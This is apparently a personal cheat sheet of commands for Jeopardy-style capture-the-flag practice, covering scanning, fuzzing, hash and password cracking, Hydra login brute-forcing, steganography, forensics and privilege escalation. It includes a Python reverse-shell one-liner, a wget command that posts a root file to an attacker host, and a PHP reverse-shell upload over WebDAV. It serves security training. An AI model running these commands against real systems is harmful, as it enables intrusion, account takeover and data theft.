# Jeopardy-style CTFs

## Recon

### Port Scanning
- #### **nmap: For normal port scan**
```sh
nmap -sS -sV -O <ip> >> ports.txt
```
- **For aggressive port scan we will use**
```sh
nmap -A -p <ports that we found from normal scan> >> ports.txt
```
```sh
nmap -A -p- -Pn <ip> -v
```
- For scanning top 100 ports and slowing down the scan for hiding from attention 
```sh
nmap -A -F -T2 <ip> -v
```
- For scanning with customizable packets
```sh
nmap -sC -sV -p- -T4 --min-rate=[packet size] -vv [MACHINE IP]
```
**Example:`nmap -sC -sV -p- -T4 --min-rate=10000 -vv 192.165.11.23`**
- It will speed up the scan but will be noticeable to the target
- For scanning wordpress vulnerable plugins
```sh
 nmap -p 80 -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500 <target-ip> >> vuln_plugin.txt
```
- For Internal Ports
```sh
ss -tulpn
```
- For Pymap
```sh
sudo python3 pymap.py -t <target-ip> --all >> ports.txt
```

<br><br>
<br><br>

### Directory Enumeration

- #### **Gobuster**
```sh
gobuster dir -u http://targetIp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt
```
```sh
gobuster dir -u <url-with-http> -w /usr/share/wordlists/dirb/common.txt -o directory.txt 
```
### SearchSploit
- **Basic Search**
```sh
searchsploit 'version name'
```
- **Searching Through Nmap Results**
    - **save the nmap results file in .xml format**
    - Example: `nmap -A -p- -oA results.xml <ip>`
```sh
searchsploit --nmap -v results.xml
```
### WordPress Enumeration
- Checking If wordpress or not
```sh
 curl -s <target-url> | grep -i wordpress
```
- **Username Enum**
```sh
wpscan --url http://<ip>/wordpress/ -e u
```
- **All Plugins Enum**
```sh
 wpscan --url http://<ip>/wordpress/ -e ap
```
### Fuzzing 

## ffuf
```sh
ffuf -u http://ffuf.me/cd/basic/FUZZ -w common.txt
ffuf -w common.txt -e .log -u http://ffuf.me/cd/ext/logs/FUZZ
ffuf -u http://ffuf.me/cd/recursion/FUZZ -w common.txt -recursion
ffuf -w common.txt -u http://ffuf.me/cd/no404/FUZZ -mc 204,301,302,307,401,403,405,500,200 -fs 669 // this has been filtered by file size and status code
ffuf -w common.txt -u http://ffuf.me/cd/no404/FUZZ -mc 204,301,302,307,401,403,405,500,200 -ac // this will filterout all its own

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.ffuf.me -H "Host: FUZZ.ffuf.me" //Fuzzing vhost
```
- subdomains
```sh
wfuzz -c -w subdomains -u "FUZZ.target" --sc 200,301,301,401 -Z
```
- Hosts
```sh
wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```


### aircrack-ng
- WPA password bruteforcing using  `.pcap` file
```sh
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.pcap
```



### JohnTheRipper

- **Chaning a human un-redable format to human readable format**
```sh
gpg2john <human non-readable> > <human readable file>
```
- Or you may say `john` readable
```sh
sudo john <human readable file>
```
```sh
sudo john --wordlist=/usr/share/wordlists/rockyou.txt root2boot
```
- SSH BruteForce Using Private Key
```sh
ssh2john id_rsa > ssh.hash
sudo john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
- Hash Decoding
```sh
john hash.txt --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt
```
### openssl
```sh
openssl aes256 -d -salt -in flag.txt.enc -out flag.txt -k unbreakablepassword1234567
```
- Here `flag.txt.enc`  contains slated password
- It will store it to `flag.txt`
### Base64 
```sh
echo -n "hashed-value" | base64 -d
```
**zip2john**
```sh
 zip2john file.zip > output.txt
```
```sh
john --format=zip output.txt
```
### gpg 
- **Import**
```sh
gpg --import <file>   
```
- **Decrypt**
```sh
gpg --decrypt <file name>
```

## Cryptography

##### Identifying Hash
```sh
haiti <hash>
```
```sh
hash-identifier        
```
- For `Transposition Cipher` [quipquip](https://www.quipqiup.com)
- [Cryptii](https://cryptii.com/)

**Finding hash-code using John The Riper**
```sh
john --list=FORMATS | grep -i <code name>
```
**Hashcat number finding**
```sh
hashcat --help | grep <number/nameofhash>
```
**Hashcat with rockyou**
```sh
 hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
**Running Hashcat in the Background**
```sh
nohup hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
- When the process takes so much time
**More Faster Hashcat using CPU and GPU**
```sh
 hashcat -a 0 -D 1,2 -w 3 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
### Some Important commands


- #### hex reverse
```sh
hexdump -v -e '1/4 "%08x"' -e '"\n"' input_file | xxd -r -p > output_file
```
- #### Editing Rockyou
```sh
 cat /usr/share/wordlists/rockyou.txt| grep -E '^.{4}$' > 4charFromRock.txt
```
- It will grep the words that have four characters 
- #### Opening Image File
```sh
eog file.png
```
- #### **Grepping flag from big directories**
```sh
 grep -r big-zip-files -e flag
```
- #### **Grepping From To**
```sh
cat outputSB.txt | grep -o -E "picoCTF.{0,50}"
```
- ### **Grepping from ZIP file**
```sh
strings files.zip| grep flag
```
- #### pdf to text
```sh
pdftotext file.pdf
```
- #### Image to text
```sh
tesseract image.png output.txt
```
- #### **Downloading everything from a directory**
```sh
wget -r http://<ip>:8008/
```
- #### **Copying Large text**
```sh
cat /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | xclip -selection clipboard
```
- #### **Web Scrapping**
```sh
 cewl -d 2 -w hash8_scrapped.txt http://<MACHINE_IP>/rtfm.re/en/sponsors/index.html
```
- #### **Finding file Type**
```sh
file <filename>
```
- #### Changing image extension
```sh
sudo apt install imagemagick -y

convert hello.jpeg hello.jpg
```
- #### **Running Python Server**
```sh
python3 -m http.server 80
```
- #### Exiftool
**Verbose**
```sh
exiftool -v3 original.jpg
```
**Setting Files to specific date and time: Using `exiftool`**
```sh
exiftool -Alldates='1970:01:01 00:00:00.001+00:00' -CreateDate='1970:01:01 00:00:00.001+00:00' -ModifyDate='1970:01:01 00:00:00.001' -SubSecCreateDate='1970:01:01 00:00:00.001' -SubSecDateTimeOriginal='1970:01:01 00:00:00.001' -SubSecModifyDate='1970:01:01 00:00:00.001' <file_name>
```
- #### **Unix Timestamp Converter**
[Link](https://www.unixtimestamp.com/)
```text
convert: 1700513181420
toThis: 
```
- #### **Basic Stegnography**
**Flag From Image**
```sh
zsteg imag.png
```
```sh
foremost image.pn
```
- Steghide is not for `.png`
```sh
steghide extract -sf <PictureName>
```
```sh
steghide info image.jpg
```
- outguess is for jpg
```sh
outguess -r 8S8OaQw.jpg outputmsg
```
- Aperis Solve Tool
```sh
aperisolve file_name
```
- #### For seeing what is running on a file `we can check if there is any root process is running on a folder or not`
```sh
ps aux
```
- #### Finding belongings of `user` group
```ls
find / -group users -type f 2>/dev/null
```
```sh
find / -type f -user <user-name> -exec ls {} + 2>/dev/null
```
- #### Finding Many files all togather
```sh
find / -type f \( -name 8V2L.txt -o -name bny0.txt -o -name D8B3.txt \) 2>>/dev/null
```
- #### Find files which are given +x permission
```sh
find /directory/path/files -type f -perm /+x
```
- #### Alternative of `sudo su` is `sudo bash`
- #### Finding a File
```sh
find / -type f -name user.txt 2> /dev/null
```
- #### [Stegsolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)
```sh
java -jar /opt/stegsolve.jar
```


### FTP Commands
- #### Downloding from  `ftp` to `local`
```sh
mget <filename>
mget *
mget *.fileextention
```
- #### Alternative of `cat`
```sh
ftp> get file.txt -
```
### Curl
- #### Mining String from Html Through Curl
```sh
curl -s http://(IP/URL)/ | grep hidden
```

### MySQL Commands

**Login**
```sh
mysql -u <name> -h <ip> -p --ssl=0
```
- We need password for this login

```sql
show databases;
use <db-name>;
show tables;
select * from <table-name>;

update <table-name> set run = 1 ;

```
### WebDav
```sh
└─$ cadaver http://<target_ip>/webdav/

Authentication required for webdav on server `10.10.236.5':
Username: wampp
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        M5WDGB5.php                         1113  Aug 12 17:45
        passwd.dav                            44  Aug 25  2019
dav:/webdav/> put hello.php
Uploading hello.php to `/webdav/hello.php':
Progress: [                              ]   0Progress: [=============================>] 100.0% of 5491 bytes succeeded.

```
- **Then try to access the webdev through your browser and you can find the php reverse shell**
- Here is My WriteUp about webdav CTF 
    - [Dav](https://github.com/Ruhanyat-994/myCTF/blob/master/THM-CTF/Dav/WriteUp.md)

### POP3 Commands

#### Login BruteForce using `Metasploit`
- Password and Username list needed
```sh
msf6 > use auxiliary/scanner/po
use auxiliary/scanner/pop3/pop3_login 
```
- Need the Listener Now

```sh
nc <target_ip> 110
```
**Commands**
- To see list of files
```sh
list
```
- To see the files
```sh
retr <list number>
```

## Scripts

- #### Tools Download History
```sh
cat /var/log/apt/history.log | grep 'tool-name'
```
- #### Python Reverse shell `One-Liner`
```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_Ip-openvpn>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- #### Exploit Suggestion : [les.sh](https://github.com/The-Z-Labs/linux-exploit-suggester)
## PrivEsc

#### My Notes
- [PrivEsc](https://github.com/Ruhanyat-994/myCTF/tree/master/THM-CTF/my-materials/PrivEsc)

#### Suid Bit Set
```sh
find / -type f -perm -04000 -ls 2>/dev/null
```
- After getting the files which have suid bit set you can search them through `searchsploit` , you can get scripts for privesc sometime.

- #### **Finding info in the crontab**
```sh
cat /etc/crontab 
```
- #### Finding backdoors
```sh
curl localhost:8080
```
- #### Searching for `Bash History`
```sh
ls -la /etc/cron.daily/
```

## Reverse Shell
- Starting listener
```sh
nc -nlvp <port_number>
```
```sh
rlwrap nc -nlvp 4444
```
## Getting the terminal Shell
- **Some time the terminal shell is not given then we have to do this!**
```sh
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```
## Exploit for `wget`
```sh
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<your machines ip>:4444
```
## Getting into As a Root User
```sh
su root
```
- **We must need the password here**

### PHP reverse-shell
```ls
/usr/share/webshell/
```
## Avoiding Read and Write Protection
- Copy the protectd file to another file
- Remove the original file


### Downloading From another System
```
wget http://ip/filename -P /tmp/
```
- Sometimes we need to download exploits to the target system
- For avoiding privilege download we can use /tmp/ folder
  
### Ip 2 Name
```sh
sudo nano /etc/hosts
```
```sh
ip    name
```
```sh
ping name
```

## Links 

- #### **Payloads**
    - [PaloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- #### **Extension Convertion for Hex code(List of file signatures)**
    - [Wiki](https://en.wikipedia.org/wiki/List_of_file_signatures?source=post_page-----8a8080672083--------------------------------)

- #### **Audio Decoder**
    - [Morsecode](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
    - [For more accurate](https://www.sonicvisualiser.org/download.html)
    - [dcode](https://www.dcode.fr/spectral-analysis)
    - sonic-visualiser
- #### Stegnography
    - [steghide webapp](https://www.aperisolve.com/)
- #### **Password Decoder**
    - [Check Psychobreak](https://www.cachesleuth.com/vanity.html)

- #### Reverse Shell `These will give you ROOT` 
    - [GTFOBINS](https://gtfobins.github.io/)
    - [PentestMonkey](https://github.com/pentestmonkey)
    - [Pentest Monkey website](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    - [swisskyrepo](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
    - [ReverseShellGenerator](https://www.revshells.com/)
    - [Exploit Suggestion](https://github.com/The-Z-Labs/linux-exploit-suggester)

- #### HashDecoder
    - [Hash Example](https://hashcat.net/wiki/doku.php?id=example_hashes)
    - [Hash Finding](https://www.tunnelsup.com/hash-analyzer/)
    - [Hash Finding 2](https://www.onlinehashcrack.com/hash-identification.php)
    - [hash killer](https://hashkiller.io/listmanager) -> **It worked good for SHA-256 decode**
    - [Crack Station](https://crackstation.net/) -> good for md4
    - [md5hashing.net](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250) -> **It worked good for MD-5 decode**
    - [Vigenere Cipher Decode](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('KeepGoing')&input=RHZjIFdAaXl1ckAxMjM)
    - [A1Z26](https://www.dcode.fr/letter-number-cipher) -> **Letter Number Cipher**
- #### Vulnerability or CVE detection
    - [AttackerKB](https://attackerkb.com/)
    - [AttackerKB TOOL](https://github.com/horshark/akb-explorer)
    - TOOl SearchSploit
## Forensics
### Basics
**DIB header of bmp file extension**
```hex
42 4d 8e 26 2c 00 00 00 00 00 ba d0 00 00 28 00
00 00 6e 04 00 00 40 03
```
[Blog on Hex problem approach](https://gddaredevil.medium.com/tunn3l-v1s10n-picoctf-2021-22af85aab8dc)
**File Type (pico)**
[Look Here](https://github.com/Ruhanyat-994/myCTF/blob/master/PicoCTF/File_Type(forensics_pico).md)  

**Searching Ip addresses in autopsy for windows machine**
```path
/Windows/system32/drivers/etc/hosts
```
- Searching through regex
```regex
 [Nn]etwork.?[Cc]ards?
```
- If the question is talking about hacking tools then search windows defender

### Memory Forensics
#### **Volatility**
- **Image or Memory information**
```sh
vol -f file.vmem imageinfo
```
- **Hash dump or Passwords**
```sh
vol -f file.vmem windows.hashdump
```
### Important commands
**Search Strings from Disk Image**
```sh
srch_strings -a disk.img | grep string
```
**For partitions**
```sh
mmls diskimage
```
**for getting into partition**
```sh
fls -o 0001140736<this is start number>  diskimage
```
**for getting into files with number**
```sh
fls -o 0001140736 diskImage 204
```
**Finding Files**
```sh
fls -r -p -o <start number> <Image Name> | grep <file name>
```

**For finding files with extension**
```sh
icat -o 0001140736  diskImage 8 |xxd |grep ".txt" -A3
```
## Hydra
**Username & Password Enum from httpBruteForce**
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/admin/:user=^USER^&pass=^PASS^&Login:Username or password invalid"
```
**Basic Http Authentication**
```sh
hydra -L users.txt -P passwords.txt http-get://example.com/
```
**Post Request for Login Forms**
```sh
hydra -L users.txt -P passwords.txt http-post-form "/login.php:user=^USER^&password=^PASS^:Invalid Login" -V
```
**Web Login BruteForce**
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -V example.com http-post-form "/login.php:user=^USER^&password=^PASS^:Invalid Login"
```
**Web Page Pin Codes BruteForcing**
```sh
hydra -l user -P pin_codes.txt http-post-form "/login.php:user=^USER^&pin=^PASS^:Invalid PIN" -V
```
**Hydra FTP Enum**
```sh
hydra -t 4 -l <username> -P <Password txt file location> ftp://<target_ip>
```
**Hydra For wp-login.php**
```sh
hydra -L <file for brute force> -p <any string> <ip-address> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```
## Brute Forcing
**Crafting Wordlist**
- [RawSec](https://inventory.raw.pm/overview.html)
- [Cracking Category](https://inventory.raw.pm/tools.html#title-tools-cracking)

**Finding Wordlist**
```sh
wordlistctl search rockyou
```
- #### Hydra for SSH password bruteforce
```sh
hydra -l <ssh name> -P <passwordlist> -t 6 ssh://target
```

- **For ports we can use `-p <portnumber>`**


## TIPS
- **Try To know the Current Versions of SSH,UBUNTU,FTP etc**

## Important WriteUps
- [stefanBargan](https://stefanbargan.medium.com/)
- [Aperi](https://www.zeecka.fr/cat/steganography/)
- [cheatsheet](https://www.aperisolve.com/cheatsheet)
- [Tomcat Penetration Testing](https://www.hackingarticles.in/tomcat-penetration-testing/)
